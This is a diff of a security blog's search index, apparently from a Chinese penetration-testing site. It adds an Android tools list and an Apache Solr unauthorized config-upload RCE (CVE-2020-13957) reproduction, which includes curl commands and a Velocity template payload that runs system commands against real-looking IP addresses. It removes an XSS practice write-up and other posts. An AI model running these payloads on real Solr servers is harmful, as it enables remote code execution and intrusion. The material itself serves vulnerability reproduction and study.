@@ -100,6 +100,32 @@
       </tags>
   </entry>
   <entry>
+    <title>AndroidTools收集</title>
+    <url>/2020/12/22/AndroidTools%E6%94%B6%E9%9B%86/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>一些小工具整理</p>
+<a id="more"></a>
+
+<hr>
+<h3 id="0x01-QtScrcpy-Android实时投屏软件"><a href="#0x01-QtScrcpy-Android实时投屏软件" class="headerlink" title="0x01 QtScrcpy: Android实时投屏软件"></a>0x01 QtScrcpy: Android实时投屏软件</h3><p><strong>在手机和电脑之间简易切换</strong><br><a href="https://github.com/barry-ran/QtScrcpy/releases">download</a></p>
+<p><img src="https://raw.githubusercontent.com/alpha302/alpha302.github.io/master/20201222141312.png"></p>
+<h3 id="0x02-Wifi-adb-通过wifi连接Android-ADB的工具"><a href="#0x02-Wifi-adb-通过wifi连接Android-ADB的工具" class="headerlink" title="0x02 Wifi adb: 通过wifi连接Android ADB的工具"></a>0x02 Wifi adb: 通过wifi连接Android ADB的工具</h3><p><strong>与QtScrcpy配合使用</strong><br><a href="https://github.com/pedrovgs/AndroidWiFiADB/releases">download</a></p>
+<p><img src="https://raw.githubusercontent.com/alpha302/alpha302.github.io/master/20201222142023.png"></p>
+<h3 id="0x03-GetAPKInfo-Android应用基本信息的工具集"><a href="#0x03-GetAPKInfo-Android应用基本信息的工具集" class="headerlink" title="0x03 GetAPKInfo: Android应用基本信息的工具集"></a>0x03 GetAPKInfo: Android应用基本信息的工具集</h3><p><strong>获取apk包名，验证证书</strong><br><a href="https://github.com/bihe0832/Android-GetAPKInfo/releases/">download</a><br><img src="https://raw.githubusercontent.com/alpha302/alpha302.github.io/master/20201222142248.png"></p>
+<h3 id="0x04-APKScan：Android应用查壳软件"><a href="#0x04-APKScan：Android应用查壳软件" class="headerlink" title="0x04 APKScan：Android应用查壳软件"></a>0x04 APKScan：Android应用查壳软件</h3><p><strong>支持主流加固厂商</strong><br>[download](链接: <a href="https://pan.baidu.com/s/1We4kGEa75lSSo6u3tTNCsA">https://pan.baidu.com/s/1We4kGEa75lSSo6u3tTNCsA</a>  密码: t7ff<br>–来自百度网盘超级会员V4的分享)</p>
+<p><img src="https://raw.githubusercontent.com/alpha302/alpha302.github.io/master/20201222143117.png"></p>
+<h3 id="0x05-Apktool-反编译apk文件"><a href="#0x05-Apktool-反编译apk文件" class="headerlink" title="0x05 Apktool: 反编译apk文件"></a>0x05 Apktool: 反编译apk文件</h3><p><strong>ApKtool是一个apk编译工具，能够反编译apk文件</strong><br><a href="https://ibotpeaches.github.io/Apktool/">download</a></p>
+<p><img src="https://raw.githubusercontent.com/alpha302/alpha302.github.io/master/20201222143734.png"></p>
+<h3 id="0x06-abe-all-android备份文件提取工具"><a href="#0x06-abe-all-android备份文件提取工具" class="headerlink" title="0x06 abe all: android备份文件提取工具"></a>0x06 abe all: android备份文件提取工具</h3><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -jar abe-<span class="hljs-literal">all</span>.jar unpack <span class="hljs-number">3</span>.ab <span class="hljs-number">3</span>.tar<br></code></pre></td></tr></table></figure>
+<p>[download](链接: <a href="https://pan.baidu.com/s/1S-PkNNhwV9aUuXmUS9Upyg">https://pan.baidu.com/s/1S-PkNNhwV9aUuXmUS9Upyg</a>  密码: bp16<br>–来自百度网盘超级会员V4的分享)</p>
+]]></content>
+      <categories>
+        <category>工具</category>
+      </categories>
+      <tags>
+        <tag>安卓</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CobaltStrike学习三</title>
     <url>/2019/10/16/CobaltStrike%E5%AD%A6%E4%B9%A0%E4%B8%89/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>能够与metasploit配合，可以相互派生shell，学会团队作战的理念，能够使用CS的协作功能。</p>
@@ -408,7 +434,7 @@
 <h2 id="2-2切换到第一台kali"><a href="#2-2切换到第一台kali" class="headerlink" title="2.2切换到第一台kali"></a>2.2切换到第一台kali</h2><p>在上一台已经拿到beacon的客户端上，创建新的连接，连接到.150这台kali启动的teamserver上<br>点击左上角，cobalt strike-&gt;new connection<br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/SZB%25%7EPU74%5D3M40VHZHK9_MB.png"></p>
 <p>Host填.150那台kali，点击connect</p>
 <p>此时在左下角我们可以看到，在客户端这儿是可以切换两台teamserver的<br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/W5SUY%6051Z%7DVKRX%25NIZQS.png"></p>
-<p>我们切换到<a href="mailto:&#x6e;&#x65;&#111;&#64;&#49;&#50;&#55;&#46;&#x30;&#x2e;&#48;&#46;&#x31;">&#x6e;&#x65;&#111;&#64;&#49;&#50;&#55;&#46;&#x30;&#x2e;&#48;&#46;&#x31;</a><br>选中一个beacon，右键spawn<br>然后选中在.150的cs客户端上创建的listener<br>点击choose即可</p>
+<p>我们切换到<a href="mailto:&#110;&#101;&#111;&#64;&#49;&#50;&#x37;&#46;&#x30;&#x2e;&#48;&#x2e;&#x31;">&#110;&#101;&#111;&#64;&#49;&#50;&#x37;&#46;&#x30;&#x2e;&#48;&#x2e;&#x31;</a><br>选中一个beacon，右键spawn<br>然后选中在.150的cs客户端上创建的listener<br>点击choose即可</p>
 <p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/KI%60VA%7DI%24LCC1FTL3IW.png"></p>
 <h2 id="2-3切换-150的cs客户端"><a href="#2-3切换-150的cs客户端" class="headerlink" title="2.3切换.150的cs客户端"></a>2.3切换.150的cs客户端</h2><p>可以看到此时已经收到.100的cs客户端spawn来的beacon了</p>
 <p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/AC8XWBKOSYDDB.png"></p>
@@ -539,6 +565,43 @@
       </categories>
       <tags>
         <tag>工具</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Solr未授权文件上传</title>
+    <url>/2020/11/21/Solr%E6%9C%AA%E6%8E%88%E6%9D%83%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><a id="more"></a>
+
+<hr>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Apache Solr 6.6.0 - 6.6.5</p>
+<p>Apache Solr 7.0.0 - 7.7.3</p>
+<p>Apache Solr 8.0.0 - 8.6.2</p>
+<h2 id="复现环境："><a href="#复现环境：" class="headerlink" title="复现环境："></a>复现环境：</h2><p>Apache solr 7.5.0</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><strong>需要solr开启cloud模式</strong></p>
+<p><img src="https://raw.githubusercontent.com/alpha302/alpha302.github.io/master/20201222153526.png"></p>
+<h3 id="0x01-首先构造含有恶意配置的howtime-zip"><a href="#0x01-首先构造含有恶意配置的howtime-zip" class="headerlink" title="0x01 首先构造含有恶意配置的howtime.zip"></a>0x01 首先构造含有恶意配置的howtime.zip</h3><p>Apache Solr历史版本下载：<a href="https://archive.apache.org/dist/lucene/solr/">https://archive.apache.org/dist/lucene/solr</a></p>
+<hr>
+<p>打开solrconfig.xml文件（solr-7.5.0/server/solr/configsets/_default）</p>
+<p>修改</p>
+<figure class="highlight sqf"><table><tr><td class="code"><pre><code class="hljs sqf">&lt;<span class="hljs-built_in">str</span> <span class="hljs-built_in">name</span>=<span class="hljs-string">&quot;params.resource.loader.enabled&quot;</span>&gt;$&#123;<span class="hljs-built_in">velocity</span>.<span class="hljs-built_in">params</span>.resource.loader.enabled:<span class="hljs-literal">false</span>&#125;&lt;/<span class="hljs-built_in">str</span>&gt;<br>为<br>&lt;<span class="hljs-built_in">str</span> <span class="hljs-built_in">name</span>=<span class="hljs-string">&quot;params.resource.loader.enabled&quot;</span>&gt;$&#123;<span class="hljs-built_in">velocity</span>.<span class="hljs-built_in">params</span>.resource.loader.enabled:<span class="hljs-literal">true</span>&#125;&lt;/<span class="hljs-built_in">str</span>&gt;<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="0x02-上传howtime恶意文件并创建配置collection"><a href="#0x02-上传howtime恶意文件并创建配置collection" class="headerlink" title="0x02 上传howtime恶意文件并创建配置collection"></a>0x02 上传howtime恶意文件并创建配置collection</h3><figure class="highlight perl"><table><tr><td class="code"><pre><code class="hljs perl">curl -X POST --header <span class="hljs-string">&quot;Content-Type:application/octet-stream&quot;</span> --data-binary @howtime.zip <span class="hljs-string">&quot;http://121.36.93.254:8983/solr/admin/configs?action=UPLOAD&amp;name=howtime&quot;</span>             <span class="hljs-comment"># 注册一个配置文件 howtime</span><br><br>curl <span class="hljs-string">&quot;http://121.36.93.254:8983/api/cluster/configs?omitHeader=true&quot;</span> <span class="hljs-comment">#查询配置文件集合是否上传成功</span><br><br>curl <span class="hljs-string">&quot;http://121.36.93.254:8983/solr/admin/configs?action=CREATE&amp;name=howtime2&amp;baseConfigSet=howtime&amp;configSetProp.immutable=false&amp;wt=xml&amp;omitHeader=true&quot;</span><br><br>curl <span class="hljs-string">&quot;http://121.36.93.254:8983/solr/admin/collections?action=CREATE&amp;name=howtime&amp;numShards=1&amp;replicationFactor=1&amp;wt=xml&amp;collection.configName=howtime2&quot;</span> <span class="hljs-comment">#使用之前上传的配置文件集合为howtime</span><br>----------------<br><br><br>Exp:<br><br>curl -v <span class="hljs-string">&quot;http://121.36.93.254:8983/solr/howtime/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=&#x27;&#x27;)+%23set($rt=$x.class.forName(&#x27;java.lang.Runtime&#x27;))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end&quot;</span><br><br></code></pre></td></tr></table></figure>
+
+
+<p><img src="https://raw.githubusercontent.com/alpha302/alpha302.github.io/master/20201222153637.png"></p>
+<p><img src="https://raw.githubusercontent.com/alpha302/alpha302.github.io/master/20201222153722.png"></p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://github.com/Imanfeng/Apache-Solr-RCE#cve-2020-13957">https://github.com/Imanfeng/Apache-Solr-RCE#cve-2020-13957</a></p>
+<p><a href="https://www.cnblogs.com/ph4nt0mer/p/13822167.html">https://www.cnblogs.com/ph4nt0mer/p/13822167.html</a></p>
+<p><a href="http://www.qwq1551.com/archives/372">http://www.qwq1551.com/archives/372</a></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>solr</tag>
+        <tag>漏洞复现</tag>
       </tags>
   </entry>
   <entry>
@@ -719,33 +782,6 @@
       </tags>
   </entry>
   <entry>
-    <title>XSS小游戏2</title>
-    <url>/2020/02/22/XSS%E5%B0%8F%E6%B8%B8%E6%88%8F2/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>你必须非常努力，才能看起来毫不费劲。</p>
-<a id="more"></a>
-
-<hr>
-<h1 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h1><p><strong>练习地址</strong> </p>
-<blockquote>
-<p><a href="https://xss.haozi.me/">https://xss.haozi.me/</a></p>
-</blockquote>
-<p><strong>网站源码</strong></p>
-<blockquote>
-<p><a href="https://github.com/haozi/xss-demo">https://github.com/haozi/xss-demo</a></p>
-</blockquote>
-<h1 id="0x00-1"><a href="#0x00-1" class="headerlink" title="0x00"></a>0x00</h1><figure class="highlight lua"><table><tr><td class="code"><pre><code class="hljs lua"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> <span class="hljs-params">(input)</span></span> &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;div&gt;&#x27;</span> + <span class="hljs-built_in">input</span> + <span class="hljs-string">&#x27;&lt;/div&gt;&#x27;</span><br>&#125;<br></code></pre></td></tr></table></figure>
-<p>无过滤</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
-<h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><pre><code></code></pre>
-]]></content>
-      <categories>
-        <category>OWASP</category>
-      </categories>
-      <tags>
-        <tag>xss</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>xss挑战 1</title>
     <url>/2020/01/09/Xss%E5%B0%8F%E6%B8%B8%E6%88%8F/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>自己对XSS的理解不深，拿小游戏来练练手正好。</p>
@@ -869,44 +905,6 @@
       </categories>
       <tags>
         <tag>xss</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>bash脚本入门————变量</title>
-    <url>/2019/12/17/bash%E8%84%9A%E6%9C%AC%E5%85%A5%E9%97%A8/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>这是一个简易的bash入门<br>适合小白白学习</p>
-<a id="more"></a>
-
-<hr>
-<h2 id="bash模式"><a href="#bash模式" class="headerlink" title="bash模式"></a>bash模式</h2><p>bash是shell解释器程序</p>
-<blockquote>
-<p>bash shell 有交互和非交互两种模式</p>
-</blockquote>
-<figure class="highlight py"><table><tr><td class="code"><pre><code class="hljs py">形如下面的东西，说明shell处于交互模式下：<br><br>user@host:~$                             <span class="hljs-comment">#shell直接与用户交互</span><br></code></pre></td></tr></table></figure>
-
-<figure class="highlight py"><table><tr><td class="code"><pre><code class="hljs py">在非交互模式下，shell从文件或者管道中读取命令并执行。<br><br>sh /path/to/script.sh<br>bash /path/to/script.sh<br>source /path/to/script.sh<br></code></pre></td></tr></table></figure>
-<h2 id="常见bash命令"><a href="#常见bash命令" class="headerlink" title="常见bash命令"></a>常见bash命令</h2><h3 id="1-变量赋值"><a href="#1-变量赋值" class="headerlink" title="1. 变量赋值"></a>1. 变量赋值</h3><ul>
-<li>单引号 ‘’</li>
-<li>双引号 “”</li>
-<li>花括号 {}</li>
-<li>圆括号 ()</li>
-<li>反引号 ``</li>
-</ul>
-<p>简单的变量赋值：</p>
-<p>bash和C类似，同样用赋值符号”=”来表示赋值，比如</p>
-<p>$var=world<br>复杂的变量赋值：<br>单引号赋值：单引号里的任何字符都会原样输出，单引号字符串中的变量是无效的</p>
-<p>子shell和当前shell<br>子shell 生成一个新的shell<br>当前shell shell在当前执行。 source/ .  </p>
-<hr>
-<p>//查看脚本语法是否有错误：</p>
-<p>//bash -n modify_suffix.sh</p>
-<p>//跟踪执行</p>
-<p>//sh -x modify_suffix.sh aaa</p>
-]]></content>
-      <categories>
-        <category>bash</category>
-      </categories>
-      <tags>
-        <tag>bash</tag>
       </tags>
   </entry>
   <entry>
@@ -1200,22 +1198,6 @@
       </tags>
   </entry>
   <entry>
-    <title>solr未授权rce——2020-13957</title>
-    <url>/2020/10/18/solr%E6%9C%AA%E6%8E%88%E6%9D%83rce%E2%80%94%E2%80%942020-13957/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>1.漏洞名称<br>2.漏洞影响范围<br>3.漏洞版本<br>4.环境搭建<br>5.漏洞复现具体步骤<br>6.漏洞基础分析<br>7.漏洞防御</p>
-<p>又要开始hw了，很烦。</p>
-<a id="more"></a>
-
-<hr>
-<figure class="highlight stata"><table><tr><td class="code"><pre><code class="hljs stata">conf1234.<span class="hljs-keyword">zip</span><br><br>1.<br>    #首先构造含有恶意配置的myconfigset.<span class="hljs-keyword">zip</span><br><br><br>2.  <br>curl -X <span class="hljs-keyword">POST</span> --header <span class="hljs-string">&quot;Content-Type:application/octet-stream&quot;</span> --data-binary @conf1234.<span class="hljs-keyword">zip</span> &quot;http:<span class="hljs-comment">//116.203.198.65:8983/solr/admin/configs?action=UPLOAD&amp;name=conf1234          #上传myconfigset.zip进入ZooKeeper</span><br><br><br>3.curl -v <span class="hljs-string">&quot;http://116.203.198.65:8983/solr/admin/collections?action=CREATE&amp;name=newCollection3&amp;numShards=2&amp;replicationFactor=1&amp;wt=xml&amp;collection.configName=conf1234&quot;</span>           #从Zookeeper中选择恶意的solrconfig.xml创建新的Collection<br><br><br><br>4.<br><br><br><br><br><br></code></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>漏洞</category>
-      </categories>
-      <tags>
-        <tag>漏洞复现</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>upload-labs通关攻略</title>
     <url>/2019/11/20/upload-labs%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>upload上传是比较基本的web漏洞，看到很多的大佬发布的钓鱼，人肉都用到过upload获取shell。个人感觉这个总结起来也比较方便简单。</p>
@@ -1392,21 +1374,6 @@
       </tags>
   </entry>
   <entry>
-    <title>护网总结</title>
-    <url>/2020/07/06/%E6%8A%A4%E7%BD%91%E6%80%BB%E7%BB%93/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>江苏省各市的护网都陆陆续续开始，自己也踩了一部分坑。这里做一个总结</p>
-<a id="more"></a>
-
-<hr>
-<h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
-      <categories>
-        <category>总结</category>
-      </categories>
-      <tags>
-        <tag>渗透测试</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>搜索引擎</title>
     <url>/2019/12/01/%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>本篇要介绍的搜索引擎包括：Shodan，censys，钟馗之眼，Google，FoFa，Dnsdb等。介绍的内容主要是这几款搜索引擎的一些高级语法，掌握高级语法会让搜索结果更准确。</p>
@@ -1560,22 +1527,6 @@
       </categories>
       <tags>
         <tag>漏洞复现</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>阿里云vps搭建私人云盘</title>
-    <url>/2020/02/10/%E9%98%BF%E9%87%8C%E4%BA%91vps%E6%90%AD%E5%BB%BA%E7%A7%81%E4%BA%BA%E4%BA%91%E7%9B%98/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>我很酷<br>我可以</p>
-<p>你滚吧</p>
-<a id="more"></a>
-
-<hr>
-]]></content>
-      <categories>
-        <category>技术</category>
-      </categories>
-      <tags>
-        <tag>VPS</tag>
       </tags>
   </entry>
 </search>
